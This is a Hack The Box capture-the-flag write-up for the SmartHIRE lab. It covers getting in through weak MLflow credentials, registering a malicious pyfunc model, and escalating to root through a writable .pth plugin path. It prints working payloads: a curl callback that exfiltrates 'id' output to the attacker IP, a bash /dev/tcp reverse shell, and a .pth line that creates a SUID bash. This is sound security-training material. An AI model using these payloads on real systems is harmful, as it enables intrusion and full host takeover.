# Hack The Box - SmartHIRE Writeup

## Summary

SmartHIRE exposed a Flask-based hiring platform on `smarthire.htb` with a hidden virtual host, `models.smarthire.htb`, hosting an MLflow instance. The MLflow service was protected with Basic Authentication, but weak credentials allowed administrative access. Using the MLflow API, a malicious `pyfunc` model was registered under the active SmartHIRE model name. When the application’s `/predict` endpoint loaded the latest model version, the malicious model’s `predict()` method executed a command on the target as `svcweb`.

Privilege escalation was achieved through a sudo rule allowing `svcweb` to run a Python MLflow control script as root. The script added plugin directories using `site.addsitedir()`. One plugin directory was writable by the `devs` group, and `svcweb` was a member of that group. A malicious `.pth` file placed in the writable plugin directory executed Python code as root, creating a SUID bash binary and providing a root shell.

---

## Target

| Item | Value |
|---|---|
| Hostname | `smarthire.htb` |
| IP | `10.129.4.192` |
| OS | Ubuntu Linux |
| Initial User | `svcweb` |
| Initial Access | MLflow model registry abuse |
| Privilege Escalation | Sudo Python plugin path abuse |

---

# 1. Enumeration

## 1.1 Port Scan

Initial Nmap enumeration identified only SSH and HTTP exposed externally:

```bash
nmap -p- --min-rate 5000 -Pn 10.129.4.192 -oN scans/tcp-full.txt
````

Service enumeration:

```bash
nmap -sC -sV -Pn -p 22,80 10.129.4.192 -oN scans/tcp-services.txt
```

Open ports:

```text
22/tcp  open  ssh   OpenSSH 8.9p1 Ubuntu
80/tcp  open  http  nginx 1.18.0 Ubuntu
```

---

## 1.2 Web Enumeration

The main web application was available at:

```text
http://smarthire.htb
```

The app allowed user registration and login. A test user was created:

```text
test@test.com : Password123!
```

After authentication, the dashboard exposed a CSV upload feature for training a hiring model.

The upload endpoint was captured in Burp:

```http
POST /upload_hiring_data HTTP/1.1
Host: smarthire.htb
Content-Type: multipart/form-data
Cookie: session=<flask-session>

Content-Disposition: form-data; name="file"; filename="valid.csv"
Content-Type: text/csv
```

A valid CSV upload returned:

```json
{
  "message": "Model trained and registered successfully",
  "registered_model": "Zendeni-fb576fbb215e-model",
  "status": "success"
}
```

The application also exposed `/model_info`, which showed the active registered model:

```bash
curl -i -s -b "$COOKIE" http://smarthire.htb/model_info
```

Response:

```json
{
  "model_info": {
    "description": "No description",
    "version": "6"
  },
  "model_name": "Zendeni-fb576fbb215e-model",
  "status": "success"
}
```

The Flask session cookie decoded to user-specific model metadata:

```bash
flask-unsign --decode --cookie '<session-cookie>'
```

Decoded content:

```python
{
  'company': 'Zendeni',
  'user_id': 'fb576fbb215e',
  'username': 'test@test.com'
}
```

---

## 1.3 Virtual Host Discovery

Virtual host fuzzing discovered:

```text
models.smarthire.htb
```

The host was added to `/etc/hosts`:

```bash
echo "10.129.4.192 smarthire.htb models.smarthire.htb" >> /etc/hosts
```

Accessing the vhost showed an MLflow Basic Auth challenge:

```bash
curl -i http://models.smarthire.htb/
```

Response:

```http
HTTP/1.1 401 UNAUTHORIZED
WWW-Authenticate: Basic realm="mlflow"
```

---

# 2. MLflow Weak Credentials

Default/weak credentials were tested:

```bash
for cred in \
'admin:password1234' \
'admin:password' \
'admin:admin' \
'mlflow:mlflow' \
'test@test.com:Password123!'
do
  echo "===== $cred ====="
  curl -i -s -u "$cred" http://models.smarthire.htb/ | head -n 20
  echo
done
```

The credentials worked:

```text
admin:password
```

Using these credentials, the MLflow API was accessible:

```bash
curl -s -u admin:password \
  http://models.smarthire.htb/api/2.0/mlflow/registered-models/search | jq .
```

The registered model matched the SmartHIRE application model:

```json
{
  "name": "Zendeni-fb576fbb215e-model",
  "version": "6",
  "source": "mlflow-artifacts:/0/17ba76fde8674fc99d3659c7a6f06a2c/artifacts/model",
  "run_id": "17ba76fde8674fc99d3659c7a6f06a2c",
  "status": "READY"
}
```

This confirmed the web application and MLflow registry were linked.

---

# 3. MLflow Artifact Enumeration

Environment variables were set for convenience:

```bash
export MLFLOW_CREDS='admin:password'
export MLFLOW_URL='http://models.smarthire.htb'
export RUN_ID='17ba76fde8674fc99d3659c7a6f06a2c'
export MODEL_NAME='Zendeni-fb576fbb215e-model'
mkdir -p loot/mlflow
```

The run was retrieved:

```bash
curl -s -u "$MLFLOW_CREDS" \
  "$MLFLOW_URL/api/2.0/mlflow/runs/get?run_id=$RUN_ID" \
  | jq . | tee loot/mlflow/run-$RUN_ID.json
```

Important run metadata:

```text
artifact_uri: mlflow-artifacts:/0/17ba76fde8674fc99d3659c7a6f06a2c/artifacts
mlflow.source.name: /var/www/smarthire.htb/.venv/bin/gunicorn
python_model: python_model.pkl
mlflow_version: 2.14.1
python_version: 3.10.12
```

Artifacts were listed:

```bash
curl -s -u "$MLFLOW_CREDS" \
  "$MLFLOW_URL/api/2.0/mlflow/artifacts/list?run_id=$RUN_ID&path=model" \
  | jq .
```

Files:

```text
model/MLmodel
model/conda.yaml
model/python_env.yaml
model/python_model.pkl
model/requirements.txt
```

Artifacts were downloaded:

```bash
export MLFLOW_TRACKING_URI='http://models.smarthire.htb'
export MLFLOW_TRACKING_USERNAME='admin'
export MLFLOW_TRACKING_PASSWORD='password'

mlflow artifacts download \
  --run-id "$RUN_ID" \
  --artifact-path model \
  --dst-path loot/mlflow/
```

The model used MLflow pyfunc with a pickle-backed Python model:

```bash
cat loot/mlflow/model/MLmodel
```

Output:

```yaml
artifact_path: model
flavors:
  python_function:
    cloudpickle_version: 3.1.1
    loader_module: mlflow.pyfunc.model
    python_model: python_model.pkl
    python_version: 3.10.12
mlflow_version: 2.14.1
```

The pickle showed the model class:

```bash
python3 -m pickletools loot/mlflow/model/python_model.pkl
```

Relevant output:

```text
utils.simplehiringmodel
SimpleHiringModel
```

This indicated that SmartHIRE loaded Python-backed MLflow models during prediction.

---

# 4. Prediction Endpoint

The `/predict` page showed that resume CSV files were uploaded to the same endpoint via `POST /predict`.

```bash
curl -i -s -b "$COOKIE" http://smarthire.htb/predict | tee predict.html
```

Interesting JavaScript:

```javascript
const res = await fetch('/predict', {
  method: 'POST',
  body: formData
});
```

A normal prediction CSV was created:

```bash
cat > resume.csv << 'EOF'
name,skills,experience,education,position_applied,previous_company
Test Candidate,"Python, SQL, Machine Learning",60,Master's in CS,Data Scientist,TechCorp
EOF
```

Prediction request:

```bash
curl -i -s \
  -b "$COOKIE" \
  -F 'file=@resume.csv;type=text/csv' \
  http://smarthire.htb/predict \
  | tee predict-normal.response.txt
```

This confirmed the application loaded the active MLflow model during prediction.

---

# 5. Remote Code Execution Through Malicious MLflow Model

## 5.1 Local MLflow Client Setup

The target used MLflow `2.14.1`, so a compatible local Python environment was required.

Because Kali only had Python 3.13, `uv` was used to install Python 3.11 locally:

```bash
cd /home/zendeni/htb_labs/smarthire/exploits/mlflow-pyfunc
pipx install uv
uv python install 3.11
uv venv --python 3.11 .venv
source .venv/bin/activate
```

Install MLflow and dependencies:

```bash
uv pip install --python .venv/bin/python "mlflow==2.14.1" "cloudpickle==3.1.1" "numpy==1.26.4" pandas
uv pip install --python .venv/bin/python "setuptools<81"
```

Verify:

```bash
.venv/bin/python -c "import pkg_resources; print('pkg_resources OK')"
.venv/bin/python -c "import mlflow; print(mlflow.__version__)"
```

Expected:

```text
2.14.1
```

---

## 5.2 Malicious Model

A malicious MLflow pyfunc model was created.

The first attempt failed because the target could not import the attacker’s local module:

```json
{"message":"No module named 'evil_model'","status":"error"}
```

This proved the app was loading the malicious model but missing the packaged code. The fix was to use `code_path`.

Create package:

```bash
cd /home/zendeni/htb_labs/smarthire/exploits/mlflow-pyfunc
rm -rf evilpkg
mkdir -p evilpkg
touch evilpkg/__init__.py
```

Create malicious model code:

```bash
cat > evilpkg/evil_model.py << 'PY'
import mlflow.pyfunc
import os

class EvilModel(mlflow.pyfunc.PythonModel):
    def predict(self, context, model_input):
        os.system("curl -s http://10.10.15.59:8000/mlflow_predict_triggered_$(id | base64 -w0)")
        return [99]
PY
```

Registration script:

```bash
cat > register_evil_model_v8.py << 'PY'
import mlflow
from evilpkg.evil_model import EvilModel

MLFLOW_URL = "http://models.smarthire.htb"
MODEL_NAME = "Zendeni-fb576fbb215e-model"

mlflow.set_tracking_uri(MLFLOW_URL)
mlflow.set_experiment("Default")

with mlflow.start_run() as run:
    mlflow.pyfunc.log_model(
        artifact_path="model",
        python_model=EvilModel(),
        code_path=["evilpkg"],
        registered_model_name=MODEL_NAME,
        pip_requirements=["mlflow==2.14.1", "cloudpickle==3.1.1", "numpy==1.26.4"]
    )
    print(f"run_id={run.info.run_id}")
PY
```

Register malicious version:

```bash
export MLFLOW_TRACKING_URI='http://models.smarthire.htb'
export MLFLOW_TRACKING_USERNAME='admin'
export MLFLOW_TRACKING_PASSWORD='password'

.venv/bin/python register_evil_model_v8.py
```

Result:

```text
Registered model 'Zendeni-fb576fbb215e-model' already exists. Creating a new version of this model...
Created version '8' of model 'Zendeni-fb576fbb215e-model'.
```

---

## 5.3 RCE Confirmation

A Python HTTP server was started on Kali:

```bash
python3 -m http.server 8000
```

The `/predict` endpoint was triggered:

```bash
curl -i -s \
  -b "$COOKIE" \
  -F 'file=@resume.csv;type=text/csv' \
  http://smarthire.htb/predict \
  | tee predict-v8-trigger.response.txt
```

Kali received the callback:

```text
10.129.4.192 - - "GET /mlflow_predict_triggered_dWlkPTEwMDAoc3Zjd2ViKSBnaWQ9MTAwMChzdmN3ZWIpIGdyb3Vwcz0xMDAwKHN2Y3dlYiksMTAwMShtbGZsb3d3ZWIpLDEwMDIoZGV2cykK HTTP/1.1"
```

The base64 decoded to:

```text
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

The app response also confirmed version `8` was loaded:

```json
{
  "model_info": {
    "version": "8"
  },
  "prediction": [99],
  "status": "success"
}
```

This confirmed command execution as `svcweb`.

---

# 6. Reverse Shell

The malicious model was modified to execute a reverse shell:

```bash
cat > evilpkg/evil_model.py << 'PY'
import mlflow.pyfunc
import os

class EvilModel(mlflow.pyfunc.PythonModel):
    def predict(self, context, model_input):
        os.system("bash -c 'bash -i >& /dev/tcp/10.10.15.59/4444 0>&1'")
        return [99]
PY
```

A listener was started:

```bash
nc -lvnp 4444
```

The model was registered again as a new version:

```bash
.venv/bin/python register_evil_model_v8.py
```

The prediction endpoint was triggered:

```bash
curl -i -s \
  -b "$COOKIE" \
  -F 'file=@resume.csv;type=text/csv' \
  http://smarthire.htb/predict
```

Reverse shell received:

```text
connect to [10.10.15.59] from 10.129.4.192
bash: no job control in this shell
svcweb@smarthire:/var/www/smarthire.htb$
```

User proof:

```bash
cat /home/svcweb/user.txt
```

---

# 7. Privilege Escalation

## 7.1 Local Enumeration

Current user:

```bash
whoami
id
groups
```

Output:

```text
svcweb
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

Sudo permissions:

```bash
sudo -l
```

Output:

```text
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

The sudo-allowed script was inspected:

```bash
sed -n '1,240p' /opt/tools/mlflow_ctl/mlflowctl.py
```

Relevant code:

```python
from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def main():
    import mlflow_actions, backup_models
```

The script added plugin directories with `site.addsitedir()`.

Writable plugin path:

```bash
find /opt/tools/mlflow_ctl -maxdepth 2 -ls
find /opt/tools/mlflow_ctl -maxdepth 2 -writable -ls 2>/dev/null
```

Output:

```text
/opt/tools/mlflow_ctl/plugins/dev
drwxrwxr-x root devs
```

Since `svcweb` was in `devs`, it could write to this plugin directory.

---

## 7.2 Exploiting `site.addsitedir()` With `.pth`

Python’s `site.addsitedir()` processes `.pth` files in site directories. Lines beginning with `import` inside `.pth` files are executed.

A malicious `.pth` file was written:

```bash
cat > /opt/tools/mlflow_ctl/plugins/dev/rootme.pth <<'EOF'
import os; os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
EOF
```

The sudo-allowed script was executed:

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Output:

```text
[*] Checking MLflow service status...
[+] MLflow service status: active
[+] MLflow container status: 'Up 3 hours'
```

The `.pth` file executed as root and created a SUID bash binary:

```bash
/tmp/rootbash -p
```

Root shell:

```bash
whoami
id
```

Output:

```text
root
uid=1000(svcweb) gid=1000(svcweb) euid=0(root) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

Root proof:

```bash
cat /root/root.txt
```

---

# 8. Attack Chain

```text
1. Discovered web app on smarthire.htb.
2. Registered a normal user account.
3. Found authenticated CSV upload and model training workflow.
4. Discovered hidden vhost models.smarthire.htb.
5. Identified exposed MLflow instance behind Basic Auth.
6. Authenticated to MLflow with weak credentials admin:password.
7. Enumerated registered MLflow models and confirmed the active SmartHIRE model.
8. Downloaded model artifacts and confirmed MLflow pyfunc/pickle model usage.
9. Registered a malicious MLflow pyfunc model version with packaged code_path.
10. Triggered /predict to load the malicious model.
11. Achieved command execution as svcweb.
12. Used a reverse shell payload to obtain an interactive shell.
13. Enumerated sudo privileges.
14. Found NOPASSWD sudo access to mlflowctl.py.
15. Identified site.addsitedir() loading a devs-writable plugin directory.
16. Wrote a malicious .pth file to execute root Python code.
17. Triggered the sudo script and created a SUID root bash binary.
18. Used /tmp/rootbash -p to obtain root.
```
